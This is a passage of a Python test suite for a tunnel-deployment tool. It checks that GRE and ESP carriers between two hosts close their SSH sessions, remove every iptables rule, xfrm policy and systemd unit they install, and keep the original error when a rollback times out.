                ("deploy_tunnel", lambda p: engine.deploy_tunnel(pair=p, choice="GRE", dry_run=False,
                                                                 force_confirmed=True)),
                ("run_single_benchmark", lambda p: engine.run_single_benchmark(p, "GRE", dry_run=False))):
            made = []

            def factory(spec, dry_run=None, host_role="unknown"):
                made.append(RecordingRunner(host_role=host_role))
                return made[-1]

            engine.get_ssh_runner = factory
            try:
                invoke(fresh_pair(8456))
            finally:
                engine.get_ssh_runner = real_factory
            self.assertEqual(sorted(r.host_role for r in made), ["foreign", "iran"],
                             f"{label} opened one session per host through the factory")
            for runner in made:
                self.assertFalse(runner.connected,
                                 f"{label} returned a {runner.host_role} session it had opened")

        # 3. The half-open case, where an ownership rule is easiest to write wrong: the caller keeps one
        #    session and the helper opens the other, so one close is correct and the other is the leak.
        ir_keep = RecordingRunner(host_role="iran")
        opened = []

        def one_side(spec, dry_run=None, host_role="unknown"):
            opened.append(RecordingRunner(host_role=host_role))
            return opened[-1]

        engine.get_ssh_runner = one_side
        try:
            engine.run_single_benchmark(fresh_pair(8457), "GRE", dry_run=False, ir_runner=ir_keep)
        finally:
            engine.get_ssh_runner = real_factory
        self.assertEqual([r.host_role for r in opened], ["foreign"],
                         "handing over the Iranian session still has to open the foreign one")
        self.assertFalse(opened[0].connected, "the benchmark left the session it opened behind")
        self.assertTrue(ir_keep.connected, "the benchmark closed the session it was handed")
        answering(ir_keep)

        # 4. The pre-flight refusal added for #40 is the newest path, and a `raise` before the `try` skips
        #    the `finally` that would have closed anything - so it is measured separately, in both shapes.
        pid_shadow = storage.add_pair(name=f"sess_front_{int(time.time() * 1000)}", iran_host=ir_pub,
                                      foreign_host=fr_pub, frontend_port=8458)
        self.addCleanup(storage.delete_pair, pid_shadow)
        esp_inner = protocols.carrier_inner_pair("ESP", pid_shadow, "prod")[1]
        gre_inner = protocols.carrier_inner_pair("GRE", pid_shadow, "prod")[1]
        self.assertNotEqual(esp_inner, gre_inner,
                            "fixture: the two carriers have different inner peers to point at")
        # The live, unquoted `-S` spelling of an older carrier owning this pair's frontend.
        occupying = (f"-A PREROUTING -p tcp -m tcp --dport 8458 -m comment --comment "
                     f"{safety.generate_firewall_comment(f'{pid_shadow}-prod', 'GRE')} "
                     f"-j DNAT --to-destination {gre_inner}:8458")
        db_shadow = {"id": pid_shadow, "name": "sess_front", "frontend": 8458,
                     "iran": {"host": ir_pub, "port": 22}, "foreign": {"host": fr_pub, "port": 22}}
        ir_h, fr_h = RecordingRunner(host_role="iran"), RecordingRunner(host_role="foreign")
        ir_h.state["prerouting"] = [occupying]
        with self.assertRaises(ValueError) as refused:
            engine.deploy_tunnel(pair=db_shadow, choice="ESP", dry_run=False, force_confirmed=True,
                                 ir_runner=ir_h, fr_runner=fr_h)
        self.assertIn("NOT_MEASURABLE", str(refused.exception))
        # The refusal is about the rule that is in force, so it names its owner and its destination -
        # and an inner carrier address is identity, not a secret, so the peer is spelled out rather than
        # masked, which is what makes the message actionable for the operator holding the chain.
        self.assertIn(gre_inner, str(refused.exception),
                      "the refusal has to say where the frontend's traffic actually goes")
        self.assertIn(str(pid_shadow), str(refused.exception),
                      "the refusal has to identify which pair's carrier is in the way")
        for runner, role in ((ir_h, "iran"), (fr_h, "foreign")):
            self.assertTrue(runner.connected, f"the refusal closed the {role} session it was handed")
            answering(runner)

        armed = []

        def armed_factory(spec, dry_run=None, host_role="unknown"):
            runner = RecordingRunner(host_role=host_role)
            if host_role == "iran":
                runner.state["prerouting"] = [occupying]
            armed.append(runner)
            return runner

        engine.get_ssh_runner = armed_factory
        try:
            with self.assertRaises(ValueError):
                engine.deploy_tunnel(pair=db_shadow, choice="ESP", dry_run=False, force_confirmed=True)
        finally:
            engine.get_ssh_runner = real_factory
        self.assertEqual(len(armed), 2, "the pre-flight runs after both sessions are opened, so both leak")
        for runner in armed:
            self.assertFalse(runner.connected,
                             f"the refusal leaked the {runner.host_role} session it opened")

        # 5. Pinned in source, because every assertion above reaches the state a mock keeps and a future
        #    edit could restore the direct close while still passing them all by accident.
        for fn in (engine.deploy_tunnel, engine.run_single_benchmark):
            body = inspect.getsource(fn)
            self.assertIn("owned_runners", body,
                          f"{fn.__name__} no longer distinguishes its own sessions from the caller's")
            for forbidden in ("ir_runner.close()", "fr_runner.close()"):
                self.assertNotIn(forbidden, body,
                                 f"{fn.__name__} closes a handed-over session by name again")
        # The one close that is correct, kept explicit so the rule reads as ownership and not as a ban.
        self.assertIn("ir_runner.close()", inspect.getsource(engine._open_pair_sessions))

    def test_71_every_rule_a_carrier_installs_it_also_deletes(self):
        """#40 Acceptance Test: install and teardown are two ends of one obligation, per host and protocol.

        Found while wiring the ESP carrier, and it is worse than a latent bug: `generate_gre` installed
        `-I INPUT 1 -i grep<N> -p tcp --dport F ... -j ACCEPT` and the udp twin on Foreign, but its
        `teardown_foreign` never deleted either rule. So every GRE redeploy added two permanent, now-inert
        ACCEPTs to Foreign's INPUT chain, each carrying the `best-tunnel-<pair>-prod-GRE` comment, with no
        bound on the accumulation. `generate_esp` copies that shape and had the identical gap, and the live
        ESP teardown measured it: Iran was left with 0 ESP-labelled rules but Foreign with exactly 2.

        The invariant is asserted structurally, not as a fixed count, because the point is a *pairing*:
        every interface- or address-scoped rule a plan installs on a host must have a matching delete in
        that host's teardown, once the noise (insert position, the auto `-m tcp` module, the comment text
        that only carries scope) is normalised away. A count would have passed on the buggy version too -
        both carriers installed their rules - it is the *set difference* that sees the orphan.
        """
        import shlex

        def canon(cmd: str) -> str:
            cmd = cmd.replace("2>/dev/null || true", "").replace(" || true", "").strip()
            toks = shlex.split(cmd)[1:]  # drop the leading `iptables`
            table, out, i = "filter", [], 0
            while i < len(toks):
                t = toks[i]
                if t == "-t":
                    table = toks[i + 1]; i += 2; continue
                if t == "-m" and toks[i + 1] == "comment":
                    i += 3; continue                      # drop -m comment --comment "<text>"
                if t == "--comment":
                    i += 2; continue
                if t in ("-A", "-I", "-D"):
                    chain = toks[i + 1]; i += 2
                    if t == "-I" and i < len(toks) and toks[i].isdigit():
                        i += 1                            # drop the insert position
                    out += [table, "-", chain]           # -A/-I/-D all canonicalise to a bare verb token
                    continue
                out.append(t); i += 1
            return " ".join(out)

        for proto in ("GRE", "ESP"):
            plan = protocols.generate_deployment(proto, 7, "198.51.100.10", "203.0.113.20", 8443)
            for side in ("iran", "foreign"):
                installed = {}
                for cmd in plan[f"{side}_cmds"]:
                    if cmd.startswith("iptables ") and (" -A " in cmd or " -I " in cmd):
                        installed.setdefault(canon(cmd), []).append(cmd)
                deleted = {canon(cmd) for cmd in plan[f"teardown_{side}"]
                           if cmd.startswith("iptables ") and " -D " in cmd}
                orphans = [sample[0] for sample in installed.values()
                           if canon(sample[0]) not in deleted]
                self.assertEqual(orphans, [],
                                 f"{proto}/{side}: a rule is installed with no matching delete, so it "
                                 f"persists on the host after teardown - {orphans}")
            # The specific defect, pinned so a future edit cannot silently re-drop these two lines: both
            # inner-frontend INPUT ACCEPTs have to be in Foreign's teardown, for both carriers.
            iface = protocols.carrier_iface(proto, 7, "prod")
            joined = "\n".join(plan["teardown_foreign"])
            for verb in ("tcp", "udp"):
                self.assertIn(f"-D INPUT -i {iface} -p {verb} --dport 8443", joined,
                              f"{proto}: Foreign's inner-frontend {verb} ACCEPT is not deleted by teardown")

    def test_72_the_esp_carrier_installs_the_inbound_policy_and_does_not_nat_its_own_probe(self):
        """#40 Acceptance Test: the two shapes that made the ESP carrier dark, pinned as requirements.

        Both halves are conclusions of a live A/B on the real pair (2026-10-11), not readings of a manual.
        With the plan as first shipped, the carrier installed nothing but `dir out` policies and Iran got
        an unscoped `POSTROUTING -d <inner peer> -j MASQUERADE`; the measurement was dark in both
        directions, and the counters said why in two different places:

          * `XfrmInNoPols` climbed on both hosts - an ESP packet had arrived, matched an SA, and been
            discarded by the *inbound* policy check. So the docstring's claim that `disable_policy=1` on
            the interface made an inbound policy unnecessary was false on this kernel, and a `dir in`
            policy that carries no template was also measured to fail: the template is required.
          * Iran's interface moved `tx_errors` and `tx_carrier_errors` one step per probe with `TX bytes 0`
            while Foreign's did not - and the only asymmetric rule in the plan is that MASQUERADE. Scoping
            it with `! -s <own inner address>` made Iran's direction deliver 4/4; restoring the unscoped
            rule under the same inbound policy made it fail again with the identical signature. Causal.

        test_71 cannot see any of this: it parses `iptables` commands, while the policies live inside a
        batch file and a policy orphan survives the interface, the SA and the unit alike.
        """
        ir_ip, fr_ip, pid = "198.51.100.10", "203.0.113.20", 9
        plan = protocols.generate_deployment("ESP", pid, ir_ip, fr_ip, 8443)
        tun_ir, tun_fr = protocols.carrier_inner_pair("ESP", pid, "prod")
        reqid = str(plan["esp"]["reqid"])

        for side, batch_key, outer_local, outer_peer, own_inner, peer_inner in (
                ("iran", "batch_ir", ir_ip, fr_ip, tun_ir, tun_fr),
                ("foreign", "batch_fr", fr_ip, ir_ip, tun_fr, tun_ir)):
            batch = plan[f"{side}_files"][plan["esp"][batch_key]]
            out_pol = [ln for ln in batch.splitlines() if "dir out" in ln]
            in_pol = [ln for ln in batch.splitlines() if "dir in" in ln]
            self.assertEqual(len(out_pol), 1, f"{side}: the outbound policy must be exactly one")
            self.assertEqual(len(in_pol), 1,
                             f"{side}: no inbound policy, so the peer decrypts the packet and then drops "
                             f"it at the policy check - the measured `XfrmInNoPols` failure")
            pol = in_pol[0]
            # The selector mirrors the outbound one: the inner pair swapped, and the template's outer
            # addresses swapped too. A `dir in` policy whose template repeats the local outer address
            # resolves to the wrong SA, which is the same mistake the outbound template above already
            # documents as producing a carrier that reports success and stays dark.
            self.assertIn(f"src {peer_inner} dst {own_inner} dir in", pol,
                          f"{side}: the inbound selector is not the mirror of the outbound one")
            self.assertIn(f"tmpl src {outer_peer} dst {outer_local} proto esp mode tunnel reqid {reqid}",
                          pol, f"{side}: the inbound policy lost its transform template, which is the "
                               f"spelling that was measured not to deliver traffic")
            # And the batch has to come back down again: a policy delete cannot be inferred from the
            # interface delete, because xfrm objects are not attached to the link's lifetime.
            joined = "\n".join(plan[f"teardown_{side}"])
            self.assertIn(f"ip xfrm policy del src {peer_inner} dst {own_inner} dir in", joined,
                          f"{side}: the inbound policy is installed and never deleted, so it orphans on "
                          f"the live host - measured after the first diagnostic run left one per host")

        # The certification path must not be source-rewritten. Iran's MASQUERADE is the rule that carries
        # forwarded client traffic, so it stays - but it must not also catch the carrier's own inner
        # source, which is what `carrier_inner_reachable` pings from.
        masq = [c for c in plan["iran_cmds"] if "POSTROUTING" in c and "MASQUERADE" in c]
        self.assertEqual(len(masq), 1, "Iran's ESP plan should install exactly one MASQUERADE rule")
        self.assertIn(f"! -s {tun_ir}", masq[0],
                      "the MASQUERADE rule matches this carrier's own inner source, which is the shape "
                      "measured to break Iran's transmit path")
        self.assertIn(f"-D POSTROUTING -d {tun_fr} ! -s {tun_ir}", "\n".join(plan["teardown_iran"]),
                      "the delete does not mirror the scoped rule token for token, so `-D` would no-op "
                      "and the rule would survive its own teardown")
        self.assertEqual([c for c in plan["foreign_cmds"] if "MASQUERADE" in c], [],
                         "Foreign gained a MASQUERADE rule it never had: the fix is a scoping, not a "
                         "blanket change to the carrier's other host")

    def test_73_the_esp_teardown_removes_systemds_record_of_the_unit_not_just_its_file(self):
        """#40 Acceptance Test: "removed" has to mean the host no longer remembers the unit.

        Measured on the real pair on 2026-10-11. The prod ESP teardown deleted every iptables rule, the
        interface, both SAs and both policies, and Foreign still answered
        `LoadState=loaded ActiveState=failed UnitFileState=bad`. `rm -f` takes the file; the failed record
        stays in systemd's memory until something reloads and clears it. It is not cosmetic: the unit
        reached that state because its stop ran out systemd's own `TimeoutStopUSec=1min 30s` while the
        45-second budget gave up first, and a carrier whose teardown ends in `failed` is a carrier the next
        `is-enabled`/`is-active` read has to interpret - which is how a redeploy inherits a verdict about a
        unit that no longer exists.

        The negative half matters as much: nothing in this teardown may be host-wide. `ip xfrm policy
        flush` would clear an orphan in one line, and would also delete an SA belonging to whatever else
        runs on a production host, so the assertion is that the deletes stay exact.
        """
        ir_ip, fr_ip, pid = "198.51.100.10", "203.0.113.20", 9
        plan = protocols.generate_deployment("ESP", pid, ir_ip, fr_ip, 8443)
        unit = f"best-tunnel-prod-p{pid}-esp"
        for side in ("iran", "foreign"):
            cmds = plan[f"teardown_{side}"]
            joined = "\n".join(cmds)
            self.assertIn(f"systemctl reset-failed {unit}", joined,
                          f"{side}: the failed record outlives the unit file")
            self.assertIn("systemctl daemon-reload", joined,
                          f"{side}: systemd keeps the deleted unit loaded without a reload")
            # Order is the content: a reload before the `rm` reloads nothing, and a reset-failed before the
            # stop clears a record the next stop will recreate.
            rm = next(i for i, c in enumerate(cmds) if c.startswith("rm -f /etc/systemd/system"))
            reload_at = next(i for i, c in enumerate(cmds) if c.startswith("systemctl daemon-reload"))
            reset_at = next(i for i, c in enumerate(cmds) if c.startswith("systemctl reset-failed"))
            stop_at = next(i for i, c in enumerate(cmds) if c.startswith("systemctl stop"))
            self.assertGreater(reload_at, rm, f"{side}: daemon-reload must follow the unit file removal")
            self.assertGreater(reset_at, stop_at, f"{side}: reset-failed must follow the stop")
            self.assertEqual(len([c for c in cmds if c.startswith("systemctl")]), 4,
                             f"{side}: four systemctl steps expected - stop, disable, reload, reset-failed")
            for table in ("policy", "state"):
                self.assertNotIn(f"xfrm {table} flush", joined,
                                 f"{side}: a host-wide xfrm {table} flush would delete other tenants' "
                                 f"objects on a production host")

    def test_74_a_rollback_that_cannot_finish_still_finishes_and_keeps_the_reason(self):
        """#40 Acceptance Test: the rollback is not allowed to become the failure it is reporting.

        Measured on the live pair on 2026-10-11. The ESP carrier's `ip link del` on the Foreign host
        blocked in the kernel for minutes - `unregister_netdevice: waiting for espp1 to become free` was
        logged 200+ times, all naming espp1, and zero times on Iran - and the deploy that hit it died with
        `TimeoutError: remote command timed out after 30s: systemctl stop best-tunnel-prod-p1-esp`. That
        was not the deploy's failure. The deploy had already failed for some other reason, entered its
        rollback, and the rollback's own teardown loop raised on the blocked host: `best_effort` absorbs a
        non-zero exit, never a timed-out transport. So the new exception replaced the one being handled,
        the reason was lost, and because the loop aborted mid-list Foreign kept its unit file enabled at
        boot with three files on disk - residue the witness then had to remove by hand.

        Three obligations, all asserted: every teardown step is still attempted after one times out, the
        exception that reaches the caller is the original one, and a rollback that could not complete is
        recorded rather than silently partial. And the negative half: a deploy that succeeds writes no
        such record.
        """
        ir_pub, fr_pub, frontend = "198.51.100.10", "203.0.113.20", 8461

        class _StallingRunner(RecordingRunner):
            """A host whose transport survives but whose commands run out their budget."""

            def __init__(self, *a, stall_on=(), blow_up_on=(), **kw):
                super().__init__(*a, **kw)
                self.stall_on, self.blow_up_on = stall_on, blow_up_on

            def run(self, cmd, **kwargs):
                self.commands.append(cmd)
                for token, why in self.blow_up_on:
                    if token in cmd:
                        raise RuntimeError(why)
                for token in self.stall_on:
                    if token in cmd:
                        raise TimeoutError(f"remote command timed out: {token}")
                return super().run(cmd, **kwargs)

        row_pid = storage.add_pair(name=f"esp_rollback_{int(time.time() * 1000)}", iran_host=ir_pub,
                                   foreign_host=fr_pub, frontend_port=frontend)
        self.addCleanup(storage.delete_pair, row_pid)
        db_pair = {"id": row_pid, "name": "esp_rollback", "frontend": frontend,
                   "iran": {"host": ir_pub, "port": 22}, "foreign": {"host": fr_pub, "port": 22}}
        stall_on = ("systemctl stop", "systemctl disable")
        # `ip link del` was in this list until test_75's rule took the device-delete verb off the carrier
        # path for good. Keeping a token that matches no shipped step would silently reduce the count to
        # the steps that still match, so the guard below is what makes a stale fixture visible.

        # Iran fails the install for a reason of its own; Foreign then stalls every step that touches the
        # interface it cannot give up. Both shapes are the live pair's, not a paraphrase of it.
        ir = _StallingRunner(host_role="iran",
                             blow_up_on=(("modprobe esp4", "ORIGINAL-CAUSE: esp4 refused to load"),))
        fr = _StallingRunner(host_role="foreign", stall_on=stall_on)
        with self.assertRaises(RuntimeError) as raised:
            engine.deploy_tunnel(pair=db_pair, choice="ESP", dry_run=False, force_confirmed=True,
                                 ir_runner=ir, fr_runner=fr)
        self.assertIn("ORIGINAL-CAUSE", str(raised.exception),
                      "the rollback's own timeout replaced the failure it was supposed to report")
        self.assertNotIsInstance(raised.exception, TimeoutError)

        unit = f"best-tunnel-prod-p{row_pid}-esp"
        # The loop kept going: the steps that come *after* the ones that stalled were still issued, so the
        # host is not left holding an enabled unit because one command was slow.
        for token in (f"rm -f /etc/systemd/system/{unit}.service", "systemctl daemon-reload",
                      f"systemctl reset-failed {unit}"):
            self.assertIn(token, fr.issued(),
                          f"a teardown that stopped at the first stalled command never reached {token!r}")

        # The count is not typed in here: it is how many of the shipped Foreign teardown steps the fixture
        # was built to stall, so a plan that grows a fourth one is reported, not silently accepted.
        plan = protocols.generate_deployment("ESP", row_pid, ir_pub, fr_pub, frontend)
        expected_stalled = len([c for c in plan["teardown_foreign"] if any(t in c for t in stall_on)])
        self.assertGreater(expected_stalled, 0, "fixture: the stall tokens match no teardown step at all")
        mine = [a for a in storage.get_audit_logs(limit=40) if a.get("pair_id") == row_pid]
        partial = [a for a in mine if a.get("action") == "DEPLOY_ROLLBACK"]
        self.assertEqual(len(partial), 1,
                         f"an incomplete rollback wrote no record: {[a.get('action') for a in mine][:6]}")
        self.assertEqual(partial[0]["status"], "PARTIAL")
        details = partial[0]["details"]
        self.assertTrue(details.startswith(f"{expected_stalled} teardown step(s) did not complete for ESP: "),
                        f"the record should count the steps that did not finish, got {details!r}")
        # Which host stalled is in the record; what it was doing is not, because the audit log is the table
        # a report is written from and a quoted remote command starts with the address it addressed.
        self.assertIn("foreign", details)
        for token in stall_on:
            self.assertNotIn(token, details, f"the rollback record quoted the command {token!r} into the audit log")

        # The negative half: nothing is recorded for a deploy that completed. Compared against the id the
        # record above already reached, because the pair legitimately still holds that first rollback's
        # row - "no DEPLOY_ROLLBACK for this pair" would fail on the fixture's own evidence.
        last_id = max([a["id"] for a in mine] or [0])
        ok_ir, ok_fr = _StallingRunner(host_role="iran"), _StallingRunner(host_role="foreign")
        dep = engine.deploy_tunnel(pair=db_pair, choice="ESP", dry_run=False, force_confirmed=True,
                                   ir_runner=ok_ir, fr_runner=ok_fr)
        self.assertTrue(dep["ok"], f"fixture: {dep}")
        self.assertEqual([a for a in storage.get_audit_logs(limit=40)
                          if a.get("pair_id") == row_pid and a.get("action") == "DEPLOY_ROLLBACK"
                          and a["id"] > last_id], [],
                         "a successful deploy wrote a partial-rollback record")

    def test_75_the_carrier_is_reused_not_unregistered_and_every_stop_caller_outlasts_systemd(self):
        """#46 Acceptance Test: nothing in the product may unregister a carrier, and no caller may read a
        slow stop as a lost connection.

        Six live runs on 2026-10-11 measured the shape. An ESP carrier that had transformed TCP traffic
        took 450/450/451/451 s to delete - and the number did not move when the tenant sockets were killed
        first, when conntrack for the inner /30 was purged on both hosts, when every SA and policy was
        deleted first, or when the link was brought down first. Each such delete parked a new
        uninterruptible task on Foreign, seven after seven teardowns, each with its own *negative*
        `Usage count` that never converged and never printed `refcount_t: underflow`, so the reference was
        driven below zero by an extra `dev_put` in the ip_vti/xfrm path rather than held by anything a
        teardown could remove. The same delete on a carrier that had never carried a packet returned in
        0 s, `ip link set down` on the loaded interface returned immediately, and Iran produced neither a
        wait message nor a parked task in any run. A journal histogram of the devices named in those
        messages listed only espp1/espp1b/espp2b: no GRE device ever appeared, which also settles the
        question report058 left unmeasured.

        Two obligations follow, and both are asserted against the shipped artifacts rather than against
        this test's own numbers:

          1. No lifecycle operation unregisters the interface. The unit is created if absent, its address
             is `replace`d, its SAs and policies are pre-cleaned by exact selector, and its stop is a link
             `down`. Nothing in the unit or either teardown list may contain a device-delete verb.
          2. The unit declares its stop budget and every caller outlasts it. mock_ssh's default 30 s is
             what turned a 450 s kernel operation into the `TimeoutError` that replaced the real deploy
             failure in test_74, and a budget shorter than `TimeoutStopUSec` re-creates that class even
             when the operation is merely slow.
        """
        ir_ip, fr_ip, pid = "198.51.100.10", "203.0.113.20", 9
        plan = protocols.generate_deployment("ESP", pid, ir_ip, fr_ip, 8443)
        iface = plan["esp"]["iface"]
        unit_name = f"best-tunnel-prod-p{pid}-esp"
        fpath = f"/etc/systemd/system/{unit_name}.service"
        units = {side: plan[f"{side}_files"][fpath] for side in ("iran", "foreign")}

        # ---- 1. the stop budget is declared by the unit, and read out of it -------------------------
        # Presence is not the property; *section* is. The first version of this assertion searched for
        # `^TimeoutStopUSec=\d+s$` anywhere in the text, which passed while the line sat under `[Service]`,
        # where systemd on both live hosts rejected it: the journal for the pair-1 carrier reads
        # `/etc/systemd/system/best-tunnel-prod-p1-esp.service:9: Unknown key 'TimeoutStopUSec' in section
        # [Service], ignoring.` twice in one stop (2026-10-11 11:40:15 and 11:42:28). The distribution
        # default happens to equal `CARRIER_STOP_BUDGET_SEC`, so `systemctl show -p TimeoutStopUSec`
        # reported `1min 30s` and every reader - this test included - took that as proof the declaration
        # had been honoured. A budget that holds only by coincidence is not a contract, and the assertion
        # now reads the file the way systemd does: which section is each line in.
        def unit_section_of(text: str, key: str) -> str:
            section = ""
            for line in text.splitlines():
                stripped = line.strip()
                if stripped.startswith("[") and stripped.endswith("]"):
                    section = stripped
                elif stripped.split("=")[0] == key and not stripped.startswith("#"):
                    return section
            return ""

        declared = {}
        for side, text in units.items():
            found = re.search(r"^TimeoutStopUSec=(\d+)s$", text, re.M)
            self.assertIsNotNone(found,
                                 f"{side}: the carrier declares no TimeoutStopUSec, so its stop budget is "
                                 f"whatever the distribution default happens to be and no caller can be "
                                 f"checked against it")
            self.assertEqual(unit_section_of(text, "TimeoutStopUSec"), "[Unit]",
                             f"{side}: TimeoutStopUSec is a [Unit] key. Declared under "
                             f"{unit_section_of(text, 'TimeoutStopUSec') or 'no section'!r} it is rejected "
                             f"with 'Unknown key ... ignoring' and the unit inherits the distribution "
                             f"default instead of the budget its callers are checked against")
            declared[side] = int(found.group(1))
        self.assertEqual(set(declared.values()), {protocols.CARRIER_STOP_BUDGET_SEC},
                         f"both carrier units must declare the one budget the module exports: {declared}")
        # Ruling: align with `systemctl show -p TimeoutStopUSec` = `1min 30s`, the distribution default
        # these hosts already applied to the unit. A different number is a decision to re-take, not a
        # constant to edit.
        self.assertEqual(protocols.CARRIER_STOP_BUDGET_SEC, 90,
                         "the stop budget is only meaningful because it equals Linux's own default; "
                         "changing it silently un-aligns the program from the host it runs on")
        self.assertGreater(protocols.TEARDOWN_TIMEOUT_SEC, max(declared.values()),
                           "a caller that gives up before systemd does reports `the transport died` for a "
                           "stop systemd is still performing")
        self.assertGreaterEqual(protocols.TEARDOWN_TIMEOUT_SEC - max(declared.values()), 30,
                                "the margin has to cover the channel's own reconnect budget, not just "
                                "the declared stop")

        # ---- 2. no lifecycle operation unregisters the interface ------------------------------------
        # Comments are stripped first: the unit's own rationale names the verb it forbids, and a check
        # that cannot tell prose from a command line would be a check on the English rather than the plan.
        def executable(text: str) -> str:
            return "\n".join(ln for ln in text.splitlines()
                             if ln.strip() and not ln.lstrip().startswith("#"))

        corpus = "\n".join([executable(t) for t in units.values()]
                           + plan["teardown_iran"] + plan["teardown_foreign"])
        offenders = [token for token in ("ip link del", "ip link delete", "ip tunnel del")
                     if token in corpus]
        self.assertEqual(offenders, [],
                         f"a device-delete verb is back on the carrier path ({offenders}): measured 450 s "
                         f"on an interface that had carried traffic, and it leaves an unreapable task "
                         f"behind every time")
        for side, text in units.items():
            stops = [ln for ln in text.splitlines() if ln.startswith("ExecStop")]
            self.assertEqual(stops, [f"ExecStop=-/sbin/ip link set {iface} down"],
                             f"{side}: the carrier's stop drifted away from a link down")
            # Reuse has to be total: a create that assumes absence fails on the second start, and `ip
            # addr add` on an interface that already holds the /30 answers RTNETLINK "File exists".
            self.assertIn(f"/sbin/ip link show dev {iface} >/dev/null 2>&1 || "
                          f"/sbin/ip link add name {iface} type vti", text,
                          f"{side}: the interface is created unconditionally, so a redeploy over a carrier "
                          f"that was only brought down dies instead of reusing it")
            self.assertIn(f"/sbin/ip addr replace ", text, f"{side}: the inner address is not replaceable")
            self.assertNotIn("/sbin/ip addr add ", text, f"{side}: `ip addr add` on a live interface fails")

        # ---- 3. the pre-clean and the teardown are one list, seen from two sides ---------------------
        for side in ("iran", "foreign"):
            payload = re.search(r"^ExecStartPre=/bin/sh -c '(.+)'$", units[side], re.M)
            self.assertIsNotNone(payload, f"{side}: no single-shell pre-clean, so the stale-SPI case is "
                                          f"unhandled and `ip -batch` dies with `File exists`")
            stmts = payload.group(1).split("; ")
            self.assertEqual(stmts[-1], "true",
                             f"{side}: the pre-clean must end in a bare `true` - it runs first on a host "
                             f"where there is nothing to delete, and a non-zero ExecStartPre aborts the unit")
            bare = stmts[:-1]
            self.assertEqual(len(bare), 6, f"{side}: four policy selectors and two SAs are the expected "
                                          f"shape, got {len(bare)} statements")
            joined = "\n".join(bare)
            self.assertNotIn("flush", joined, f"{side}: a host-wide xfrm flush on a production host")
            for bad in ("(", ")", "`", "$"):
                self.assertNotIn(bad, joined,
                                 f"{side}: {bad!r} inside the pre-clean reaches a root shell's parser, "
                                 f"which is how the AEAD name broke this generator once already")
            self.assertIn(f"src {ir_ip} dst {fr_ip} proto esp spi 0x", joined,
                          f"{side}: the pre-clean does not name this pair's deterministic SPI, so a "
                          f"stale SA from an earlier revision survives and the new one is never installed")
            teardown_xfrm = [c[: -len(" 2>/dev/null || true")]
                             for c in plan[f"teardown_{side}"] if c.startswith("/sbin/ip xfrm")]
            self.assertEqual(bare, teardown_xfrm,
                             f"{side}: the unit's pre-clean and that host's teardown are two hand-written "
                             f"lists that have drifted apart")

        # ---- 3b. the teardown drains before it stops, because the stop itself can park ----------------
        # Not a style preference. On 2026-10-11 the carrier stop was issued while the SAs were still
        # installed and a tenant was pushing 157 Mbps through the interface, and it never completed:
        # `State 'stop-sigterm' timed out. Killing.` -> `Processes still around after SIGKILL. Ignoring.` ->
        # the record ending `Result=timeout ActiveState=failed` with an `ip` task still in D. The same
        # command on the same interface after the carrier went idle returned in 0.42 s
        # (scratch/carrier_zombie_state_20261011.out), and `ip -o link show` still answered throughout - the
        # stall is per-device, not the host's RTNL (scratch/rtnl_blockage_20261011.out: both hosts mutate
        # their netdevices in under half a second while Foreign carries eight parked tasks). So the rule the
        # list has to keep is that the operations measured to finish run before the one measured to park,
        # and that the carrier is made incapable of carrying by *crypto removal*, which is not the fragile
        # operation.
        for side in ("iran", "foreign"):
            cmds = plan[f"teardown_{side}"]

            def first_idx(pred):
                for i, c in enumerate(cmds):
                    if pred(c):
                        return i
                return -1

            i_rule = first_idx(lambda c: c.startswith("iptables -D"))
            i_last_rule = max((i for i, c in enumerate(cmds) if c.startswith("iptables -D")), default=-1)
            i_xfrm = first_idx(lambda c: c.startswith("/sbin/ip xfrm"))
            i_stop = first_idx(lambda c: c.startswith("systemctl stop"))
            i_down = first_idx(lambda c: c.startswith("ip link set") and c.endswith("down 2>/dev/null || true"))
            for label, idx in (("rule delete", i_rule), ("xfrm delete", i_xfrm),
                               ("systemctl stop", i_stop), ("link down", i_down)):
                self.assertGreater(idx, -1, f"{side}: the teardown list lost its {label}")
            self.assertLess(i_last_rule, i_xfrm,
                            f"{side}: the crypto is deleted at {i_xfrm} but a rule is still being removed "
                            f"at {i_last_rule}; traffic is still being admitted while the SAs go away")
            self.assertLess(i_xfrm, i_stop,
                            f"{side}: the stop runs at {i_stop} with the SAs and policies still installed "
                            f"({i_xfrm}), which is the state this carrier's stop was measured to park in")
            self.assertLess(i_stop, i_down,
                            f"{side}: the redundant link-down must stay behind the unit stop, so a stop "
                            f"that a stuck unit never ran is still attempted last")
            self.assertNotIn("ip link del", "\n".join(cmds),
                             f"{side}: a delete verb returned to the teardown list")

        # ---- 4. every caller that stops a best-tunnel unit outlasts its declared budget --------------
        default_timeout = inspect.signature(mock_ssh.MockSSHClient.run).parameters["timeout"].default

        class _BudgetRunner(RecordingRunner):
            """Records the budget each command was actually issued with, not the one the caller meant."""

            def __init__(self, *a, **kw):
                super().__init__(*a, **kw)
                self.budgets: list[tuple[str, object]] = []

            def run(self, cmd, **kwargs):
                self.budgets.append((cmd, kwargs.get("timeout", default_timeout)))
                return super().run(cmd, **kwargs)

            def short_budgets(self) -> list[object]:
                return [to for _, to in self.budgets if to == default_timeout]

        def check(label, runners, steps):
            issued = [b for r in runners for b in r.budgets]
            lifecycle = [(c, to) for c, to in issued
                         if ("systemctl stop" in c or "systemctl restart" in c) and "best-tunnel" in c]
            self.assertTrue(lifecycle, f"{label}: not one carrier lifecycle command was issued, so this "
                                       f"check would pass on an empty list")
            n_short = len([1 for c, to in lifecycle if to == default_timeout])
            self.assertEqual(n_short, 0,
                             f"{label}: {n_short} of {len(lifecycle)} best-tunnel stop/restart commands "
                             f"were issued with mock_ssh's default {default_timeout}s budget instead of "
                             f"the {protocols.TEARDOWN_TIMEOUT_SEC}s the declared stop can take")
            stepped = [to for c, to in issued if c in steps]
            self.assertTrue(stepped, f"{label}: no shipped teardown step was issued, fixture is broken")
            self.assertEqual({to for to in stepped}, {protocols.TEARDOWN_TIMEOUT_SEC},
                             f"{label}: teardown steps did not share one budget")

        # (a) a deploy that fails and rolls back - the path that produced the live TimeoutError.
        db_pair = {"id": pid, "name": "esp_budget", "frontend": 8443,
                   "iran": {"host": ir_ip, "port": 22}, "foreign": {"host": fr_ip, "port": 22}}
        class _Failing(_BudgetRunner):
            def run(self, cmd, **kwargs):
                if "modprobe esp4" in cmd:
                    raise RuntimeError("fixture: esp4 refused to load")
                return super().run(cmd, **kwargs)

        ir_a, fr_a = _Failing(host_role="iran"), _BudgetRunner(host_role="foreign")
        with self.assertRaises(RuntimeError):
            engine.deploy_tunnel(pair=db_pair, choice="ESP", dry_run=False, force_confirmed=True,
